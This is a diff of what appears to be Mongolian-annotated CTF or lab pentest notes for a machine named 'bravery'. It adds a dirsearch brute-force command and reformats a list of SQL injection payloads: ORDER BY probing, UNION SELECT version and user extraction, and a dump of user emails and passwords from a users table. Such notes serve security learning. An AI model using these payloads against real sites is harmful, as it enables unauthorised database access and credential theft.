@@ -18,6 +18,9 @@ sudo nmap -sV -T4 -p- -O -oN nmap bravery
 <br>
 ##### Directory Bruteforcing
 <br>
+```
+python3 dirsearch.py -u http://example.com
+```
 ##### Nikto
 
 ```
@@ -37,7 +40,8 @@ nikto -h $HOST
 ' order by 7 --
 ' order by 8 --
 ' order by 9 --
-' union select 1,2,3,4,5,6,7,8 -- - ( Хэрвээ 4-р хэрэглэгчээр нэвтрэх юм бол )
+' union select 1,2,3,4,5,6,7,8 -- - 
+( Хэрвээ 4-р хэрэглэгчээр нэвтрэх юм бол )
 ' union select 1,2,3,@@version,5,6,7,8 -- -
 ' union select 1,2,3,user(),5,6,7,8 -- -
 
@@ -45,9 +49,11 @@ nikto -h $HOST
 
 ' union select 1,2,3,group_concat(column_name),5,6,7,8 from information_schema,columns where table_name='users'-- -
 
-' union select 1,2,3,column_name,5,6,7,8 from information_schema,columns where table_name='users'-- - ( Group-лээд гаргаж ирнэ )
+' union select 1,2,3,column_name,5,6,7,8 from information_schema,columns where table_name='users'-- - 
+( Group-лээд гаргаж ирнэ )
 
-' union select 1,2,3,group_concat(user_id,0x3a,first_name,0x3a,last_name,0x3a,email,0x3a, pass,0x3a,user_level),5,6,7,8 from users-- - ( table бүрийн урд хэсэгт 0x3a бичиж өгнө )
+' union select 1,2,3,group_concat(user_id,0x3a,first_name,0x3a,last_name,0x3a,email,0x3a, pass,0x3a,user_level),5,6,7,8 from users-- - 
+( table бүрийн урд хэсэгт 0x3a бичиж өгнө )
 
 File унших ( Read File )
 
